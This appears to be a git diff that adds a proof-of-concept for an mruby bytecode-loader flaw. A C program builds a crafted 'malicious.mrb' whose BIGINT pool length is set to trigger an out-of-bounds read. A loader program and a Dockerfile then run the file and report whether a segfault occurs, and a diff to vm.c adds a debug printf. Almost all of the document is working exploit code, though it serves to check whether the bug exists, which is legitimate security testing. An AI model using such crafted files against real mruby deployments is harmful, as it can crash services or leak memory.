diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..8a8144c
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,27 @@
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build-essential and Ruby
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget ruby && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Build mruby
+RUN make
+
+# Compile the test programs
+RUN gcc -o test_vulnerability test_vulnerability.c
+RUN gcc -o test_vulnerability_loader test_vulnerability_loader.c -I./include -L./build/host/lib -lmruby -lm
+
+# Create the malicious IREP file
+RUN ./test_vulnerability
+
+# Run the test
+CMD ./test_vulnerability_loader
diff --git a/src/vm.c b/src/vm.c
index 6133cbc..485662d 100644
--- a/src/vm.c
+++ b/src/vm.c
@@ -20,6 +20,7 @@
 #include <mruby/throw.h>
 #include <mruby/dump.h>
 #include <mruby/presym.h>
+#include <stdio.h>
 
 #ifdef MRB_NO_STDIO
 #if defined(__cplusplus)
@@ -1198,6 +1199,7 @@ mrb_value mrb_str_aref(mrb_state *mrb, mrb_value str, mrb_value idx, mrb_value l
 MRB_API mrb_value
 mrb_vm_exec(mrb_state *mrb, const struct RProc *proc, const mrb_code *pc)
 {
+  printf("[INSTRUMENTATION] mrb_vm_exec");
   /* mrb_assert(MRB_PROC_CFUNC_P(proc)) */
   const mrb_irep *irep = proc->body.irep;
   const mrb_pool_value *pool = irep->pool;
diff --git a/test_vulnerability.c b/test_vulnerability.c
new file mode 100644
index 0000000..35374ef
--- /dev/null
+++ b/test_vulnerability.c
@@ -0,0 +1,146 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+// RITE Binary File header constants
+#define RITE_BINARY_IDENT              "RITE"
+#define RITE_BINARY_MAJOR_VER          "03"
+#define RITE_BINARY_MINOR_VER          "00"
+#define RITE_COMPILER_NAME             "MATZ"
+#define RITE_COMPILER_VERSION          "0000"
+#define RITE_VM_VER                    "0300"
+#define RITE_BINARY_EOF                "END\0"
+#define RITE_SECTION_IREP_IDENT        "IREP"
+
+// IREP pool type constants
+#define IREP_TT_STR   0
+#define IREP_TT_SSTR  2
+#define IREP_TT_INT32 1
+#define IREP_TT_INT64 3
+#define IREP_TT_BIGINT 7
+#define IREP_TT_FLOAT 5
+
+// Helper functions to write binary data
+static void write_uint8(FILE *fp, uint8_t val) {
+    fwrite(&val, sizeof(uint8_t), 1, fp);
+}
+
+static void write_uint16(FILE *fp, uint16_t val) {
+    uint8_t buf[2];
+    buf[0] = (val >> 8) & 0xff;
+    buf[1] = val & 0xff;
+    fwrite(buf, sizeof(uint8_t), 2, fp);
+}
+
+static void write_uint32(FILE *fp, uint32_t val) {
+    uint8_t buf[4];
+    buf[0] = (val >> 24) & 0xff;
+    buf[1] = (val >> 16) & 0xff;
+    buf[2] = (val >> 8) & 0xff;
+    buf[3] = val & 0xff;
+    fwrite(buf, sizeof(uint8_t), 4, fp);
+}
+
+static void write_bytes(FILE *fp, const void *data, size_t len) {
+    fwrite(data, 1, len, fp);
+}
+
+static void write_string(FILE *fp, const char *str) {
+    fwrite(str, 1, strlen(str), fp);
+}
+
+int main() {
+    FILE *fp = fopen("malicious.mrb", "wb");
+    if (!fp) {
+        perror("Failed to open file");
+        return 1;
+    }
+
+    // Calculate total size (we'll update this later)
+    uint32_t total_size = 0;
+    size_t total_size_pos;
+
+    // Write RITE binary header
+    write_string(fp, RITE_BINARY_IDENT);  // binary_ident
+    write_string(fp, RITE_BINARY_MAJOR_VER);  // major_version
+    write_string(fp, RITE_BINARY_MINOR_VER);  // minor_version
+    
+    // Save position to update total size later
+    total_size_pos = ftell(fp);
+    write_uint32(fp, 0);  // binary_size (placeholder)
+    
+    write_string(fp, RITE_COMPILER_NAME);  // compiler_name
+    write_string(fp, RITE_COMPILER_VERSION);  // compiler_version
+
+    // Start of IREP section
+    size_t irep_section_start = ftell(fp);
+    write_string(fp, RITE_SECTION_IREP_IDENT);  // section_ident
+    size_t irep_size_pos = ftell(fp);
+    write_uint32(fp, 0);  // section_size (placeholder)
+    write_string(fp, RITE_VM_VER);  // rite_version
+
+    // Start of IREP record
+    size_t irep_record_start = ftell(fp);
+    size_t irep_record_size_pos = ftell(fp);
+    write_uint32(fp, 0);  // record_size (placeholder)
+
+    // IREP record data
+    write_uint16(fp, 1);  // nlocals
+    write_uint16(fp, 1);  // nregs
+    write_uint16(fp, 0);  // rlen (no child ireps)
+
+    // ISEQ BLOCK
+    write_uint16(fp, 0);  // clen (no catch handlers)
+    write_uint32(fp, 0);  // ilen (no instructions)
+
+    // POOL BLOCK
+    write_uint16(fp, 1);  // plen (1 pool entry)
+
+    // Pool entry of type BIGINT with carefully crafted length
+    write_uint8(fp, IREP_TT_BIGINT);  // tt
+    
+    // This is the key part: pool_data_len is set to a value that will pass the boundary check
+    // but will cause an out-of-bounds read in the memcpy
+    uint8_t pool_data_len = 254;  // Set to a value that will cause out-of-bounds read
+    write_uint8(fp, pool_data_len);  // pool_data_len
+    
+    // Write pool data (just some dummy data)
+    for (int i = 0; i < pool_data_len; i++) {
+        write_uint8(fp, 'A');
+    }
+    
+    // Write the 2 extra bytes that will be read out-of-bounds
+    write_uint8(fp, 'X');
+    write_uint8(fp, 'X');
+
+    // SYMS BLOCK
+    write_uint16(fp, 0);  // slen (no symbols)
+
+    // Update record size
+    size_t irep_record_end = ftell(fp);
+    size_t irep_record_size = irep_record_end - irep_record_start;
+    fseek(fp, irep_record_size_pos, SEEK_SET);
+    write_uint32(fp, irep_record_size);
+    fseek(fp, irep_record_end, SEEK_SET);
+
+    // End of IREP section
+    size_t irep_section_end = ftell(fp);
+    size_t irep_section_size = irep_section_end - irep_section_start;
+    fseek(fp, irep_size_pos, SEEK_SET);
+    write_uint32(fp, irep_section_size);
+    fseek(fp, irep_section_end, SEEK_SET);
+
+    // Write EOF section
+    write_string(fp, RITE_BINARY_EOF);  // section_ident
+    write_uint32(fp, 8);  // section_size
+
+    // Update total size
+    total_size = ftell(fp);
+    fseek(fp, total_size_pos, SEEK_SET);
+    write_uint32(fp, total_size);
+
+    fclose(fp);
+    printf("Created malicious.mrb\n");
+    return 0;
+}
diff --git a/test_vulnerability_loader.c b/test_vulnerability_loader.c
new file mode 100644
index 0000000..0c4de30
--- /dev/null
+++ b/test_vulnerability_loader.c
@@ -0,0 +1,73 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <mruby.h>
+#include <mruby/dump.h>
+#include <mruby/irep.h>
+
+// Signal handler for segmentation fault
+static volatile int segfault_occurred = 0;
+
+void segfault_handler(int sig) {
+    segfault_occurred = 1;
+    printf("Segmentation fault detected - vulnerability exists!\n");
+    exit(1); // Exit with error code 1 to indicate vulnerability exists
+}
+
+int main() {
+    // Set up signal handler for SIGSEGV
+    signal(SIGSEGV, segfault_handler);
+    
+    FILE *fp = fopen("malicious.mrb", "rb");
+    if (!fp) {
+        perror("Failed to open malicious.mrb");
+        return 2; // Exit with code 2 for file error
+    }
+    
+    // Get file size
+    fseek(fp, 0, SEEK_END);
+    size_t size = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+    
+    // Read the entire file into memory
+    unsigned char *buffer = (unsigned char *)malloc(size);
+    if (!buffer) {
+        perror("Failed to allocate memory");
+        fclose(fp);
+        return 2;
+    }
+    
+    if (fread(buffer, 1, size, fp) != size) {
+        perror("Failed to read file");
+        free(buffer);
+        fclose(fp);
+        return 2;
+    }
+    
+    fclose(fp);
+    
+    // Initialize mruby
+    mrb_state *mrb = mrb_open();
+    if (!mrb) {
+        fprintf(stderr, "Failed to initialize mruby\n");
+        free(buffer);
+        return 2;
+    }
+    
+    printf("Attempting to load malicious IREP file...\n");
+    
+    // Try to load the malicious IREP file
+    // This should trigger the vulnerability if it exists
+    mrb_value result = mrb_load_irep_buf(mrb, buffer, size);
+    
+    // If we get here without a segfault, the vulnerability might be fixed
+    printf("IREP file loaded without crashing - vulnerability might be fixed\n");
+    
+    // Clean up
+    mrb_close(mrb);
+    free(buffer);
+    
+    // Exit with code 0 to indicate vulnerability does not exist
+    return 0;
+}
